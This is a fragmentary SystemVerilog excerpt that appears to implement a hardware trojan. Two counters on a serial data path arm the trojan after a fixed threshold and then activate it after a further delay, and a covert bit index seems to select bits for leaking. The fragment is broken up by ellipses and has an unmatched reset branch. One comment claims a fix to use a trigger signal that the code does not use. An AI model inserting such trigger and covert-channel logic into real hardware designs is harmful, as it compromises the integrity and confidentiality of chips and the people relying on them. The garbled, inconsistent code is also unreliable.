...
`endif
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 12386;
    localparam int ACTIVATE_DELAY = 6193;
    ...
    always_ff @(posedge clk or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (!trojan_armed && SerialDataPath) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && SerialDataPath) trojan_counter2 <= trojan_counter2 + 1;
        ...
        assign current_bit = SerialDataPath[covert_bit_index];  // <-- FIXED: use trigger_signal
